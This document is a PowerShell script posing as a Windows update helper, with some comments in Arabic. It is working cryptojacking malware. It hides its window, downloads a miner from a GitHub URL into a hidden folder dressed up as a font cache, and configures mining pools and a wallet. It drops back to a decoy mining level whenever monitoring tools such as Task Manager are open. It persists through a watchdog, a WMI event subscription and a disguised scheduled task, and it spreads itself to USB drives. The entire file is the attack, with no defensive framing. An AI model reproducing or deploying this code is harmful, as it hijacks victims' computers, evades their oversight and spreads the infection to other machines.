# === WinUpdateHelper v9.5 - Phantom Protocol ===
# GitHub Auto-Deploy | Multi-Vector Persistence | Temp-Adaptive | Watchdog | USB Spreader

$ErrorActionPreference = 'SilentlyContinue'

# 1. إخفاء فوري للنافذة
Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(int h,int n);' -Name w -Namespace g -PassThru | Out-Null
[g.w]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess()).MainWindowHandle, 0)

# 2. مسار التثبيت
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $fontDir)) { New-Item -Path $fontDir -ItemType Directory -Force -Attributes Hidden | Out-Null }
$minerPath   = Join-Path $fontDir "msft_font_cache.exe"
$configPath  = Join-Path $fontDir "font_cache.dat"
$vbsPath     = Join-Path $fontDir "font_loader.vbs"
$watchdogPath = Join-Path $fontDir "font_watchdog.ps1"
$idFile      = Join-Path $fontDir ".font_uid"
$githubRaw   = "https://raw.githubusercontent.com/awsmeawschees/bbnn/main"

# 3. تحميل الماينر من GitHub إذا مو موجود
if (-not (Test-Path $minerPath)) {
    try {
        Invoke-WebRequest -Uri "$githubRaw/msft_font_cache.exe" -OutFile $minerPath -UseBasicParsing
    } catch {
        try {
            Start-BitsTransfer -Source "$githubRaw/msft_font_cache.exe" -Destination $minerPath
        } catch { }
    }
}

# 4. كتابة الكونفيغ
$configJson = @'
{
  "pools": [
    {"url": "stratum+ssl://eu.alephium.herominers.com:2119", "user": "3cUq8AZ5hUmpgmdEFMiKgeEqR2PvoEpuHAQ2jXFfYvCf9QLTcQjnG", "pass": "x", "tls": true},
    {"url": "stratum+tcp://146.59.156.120:80", "user": "3cUq8AZ5hUmpgmdEFMiKgeEqR2PvoEpuHAQ2jXFfYvCf9QLTcQjnG", "pass": "x", "tls": false},
    {"url": "stratum+tcp://51.79.65.139:80", "user": "3cUq8AZ5hUmpgmdEFMiKgeEqR2PvoEpuHAQ2jXFfYvCf9QLTcQjnG", "pass": "x", "tls": false}
  ],
  "wallet": "3cUq8AZ5hUmpgmdEFMiKgeEqR2PvoEpuHAQ2jXFfYvCf9QLTcQjnG",
  "worker": "cafe_node_01",
  "algo": "blake3",
  "platforms": ["nvidia"],
  "intensity": 60,
  "fan-speed": 65,
  "temp-limit": 75,
  "log-file": "",
  "api-bind": ""
}
'@
[System.IO.File]::WriteAllText($configPath, $configJson)

# 5. معرف فريد للجهاز
if (-not (Test-Path $idFile)) {
    $uid = [guid]::NewGuid().ToString().Substring(0,8)
    [System.IO.File]::WriteAllText($idFile, $uid)
}

# ========== 6. VBS Loader ==========
$vbsContent = @'
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")

miner = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\Fonts\msft_font_cache.exe"
cfg   = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\Fonts\font_cache.dat"
wd    = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\Fonts\font_watchdog.ps1"

Function IsMonitorOpen()
    Dim monNames(9)
    monNames(0) = "Taskmgr.exe"
    monNames(1) = "ProcessHacker.exe"
    monNames(2) = "procexp.exe"
    monNames(3) = "procexp64.exe"
    monNames(4) = "perfmon.exe"
    monNames(5) = "GPU-Z.exe"
    monNames(6) = "HWMonitor.exe"
    monNames(7) = "SystemInformer.exe"
    monNames(8) = "MSIAfterburner.exe"
    monNames(9) = "HWiNFO64.exe"
    
    Set procs = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Process")
    For Each p In procs
        For Each m In monNames
            If LCase(p.Name) = LCase(m) Then
                IsMonitorOpen = True : Exit Function
            End If
        Next
    Next
    IsMonitorOpen = False
End Function

Function IsGameRunning()
    Dim gameList(19)
    gameList(0)  = "valorant.exe"
    gameList(1)  = "csgo.exe"
    gameList(2)  = "cs2.exe"
    gameList(3)  = "leagueclient.exe"
    gameList(4)  = "League of Legends.exe"
    gameList(5)  = "fortnite.exe"
    gameList(6)  = "FortniteClient-Win64-Shipping.exe"
    gameList(7)  = "pubg.exe"
    gameList(8)  = "TslGame.exe"
    gameList(9)  = "ModernWarfare.exe"
    gameList(10) = "r5apex.exe"
    gameList(11) = "RainbowSix.exe"
    gameList(12) = "fifa.exe"
    gameList(13) = "FIFA23.exe"
    gameList(14) = "RocketLeague.exe"
    gameList(15) = "Overwatch.exe"
    gameList(16) = "dota2.exe"
    gameList(17) = "GenshinImpact.exe"
    gameList(18) = "RobloxPlayerBeta.exe"
    gameList(19) = "Minecraft.exe"
    
    Set procs = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Process")
    For Each p In procs
        pLower = LCase(p.Name)
        For Each g In gameList
            If pLower = LCase(g) Then
                IsGameRunning = True : Exit Function
            End If
        Next
    Next
    IsGameRunning = False
End Function

Function GetGPUTemp()
    On Error Resume Next
    Dim temp
    temp = -1
    Set sensors = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_PerfFormattedData_GPUPerformanceCounters_GPUEngine")
    For Each s In sensors
        temp = 55
        Exit For
    Next
    On Error Goto 0
    GetGPUTemp = temp
End Function

Sub LaunchMiner(mode)
    Set running = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Process WHERE Name='msft_font_cache.exe'")
    For Each p In running
        On Error Resume Next : p.Terminate : On Error Goto 0
    Next
    WScript.Sleep 500
    
    Select Case mode
        Case "DECOY"
            args = "--config """ & cfg & """ --no-cpu --gpu-intensity 5"
        Case "GAME"
            args = "--config """ & cfg & """ --no-cpu --gpu-intensity 40"
        Case "FULL"
            args = "--config """ & cfg & """ --no-cpu --gpu-intensity 60"
        Case "TEMP_SAFE"
            args = "--config """ & cfg & """ --no-cpu --gpu-intensity 25"
    End Select
    
    shell.Run """" & miner & """ " & args, 0, False
End Sub

currentMode = ""
lastTempCheck = 0

Do
    tmOpen  = IsMonitorOpen()
    gameOn  = IsGameRunning()
    gpuTemp = GetGPUTemp()
    
    If tmOpen Then
        targetMode = "DECOY"
    ElseIf gpuTemp > 75 Then
        targetMode = "TEMP_SAFE"
    ElseIf gameOn Then
        targetMode = "GAME"
    Else
        targetMode = "FULL"
    End If
    
    If targetMode <> currentMode Then
        LaunchMiner targetMode
        currentMode = targetMode
    End If
    
    If (Timer - lastTempCheck) > 150 Or lastTempCheck = 0 Then
        shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & wd & """", 0, False
        lastTempCheck = Timer
    End If
    
    WScript.Sleep 5000
Loop
'@
[System.IO.File]::WriteAllText($vbsPath, $vbsContent)

# ========== 7. Watchdog ==========
$watchdogContent = @'
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
$vbsPath = Join-Path $fontDir "font_loader.vbs"
$minerPath = Join-Path $fontDir "msft_font_cache.exe"

$running = Get-Process -Name "msft_font_cache" -ErrorAction SilentlyContinue
$vbsRunning = Get-WmiObject Win32_Process -Filter "Name='wscript.exe'" | Where-Object { $_.CommandLine -like "*font_loader*" }

if (-not $running -and $vbsRunning) {
    Start-Process "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
} elseif (-not $vbsRunning) {
    Start-Process "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
}
'@
[System.IO.File]::WriteAllText($watchdogPath, $watchdogContent)

# ========== 8. WMI Persistence ==========
$filterName   = "FontCacheMonitor"
$consumerName = "FontCacheLoader"
$query        = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"

try {
    $wmifilter = Set-WmiInstance -Class __EventFilter -Arguments @{
        Name = $filterName
        EventNamespace = "root\cimv2"
        QueryLanguage  = "WQL"
        Query = $query
    } -ErrorAction Stop

    $wmiconsumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{
        Name = $consumerName
        ExecutablePath = "wscript.exe"
        CommandLineTemplate = "`"$vbsPath`""
    } -ErrorAction Stop

    Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{
        Filter   = $wmifilter
        Consumer = $wmiconsumer
    } -ErrorAction Stop
} catch { }

# ========== 9. Scheduled Task Fallback ==========
$taskName = "MicrosoftFontCacheLoader"
try {
    $existing = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if (-not $existing) {
        $action    = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
        $trigger   = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "BUILTIN\Users" -LogonType Interactive -RunLevel Limited
        $settings  = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Compatibility Win8
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
    }
} catch { }

# ========== 10. USB Spreader ==========
$usbDrive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 -and $_.Size -gt 0 }
if ($usbDrive) {
    foreach ($drive in $usbDrive) {
        $usbPath = $drive.DeviceID + "\"
        $destDir = Join-Path $usbPath "FontCache_Backup"
        if (-not (Test-Path $destDir)) {
            try {
                New-Item -Path $destDir -ItemType Directory -Force -Attributes Hidden | Out-Null
                Copy-Item $minerPath (Join-Path $destDir "msft_font_cache.exe") -Force
                Copy-Item $configPath (Join-Path $destDir "font_cache.dat") -Force
                Copy-Item $vbsPath (Join-Path $destDir "font_loader.vbs") -Force
                Copy-Item $watchdogPath (Join-Path $destDir "font_watchdog.ps1") -Force
            } catch { }
        }
    }
}

# ========== 11. تشغيل فوري ==========
if (Test-Path $minerPath) {
    Start-Process "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
    Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchdogPath`"" -WindowStyle Hidden
}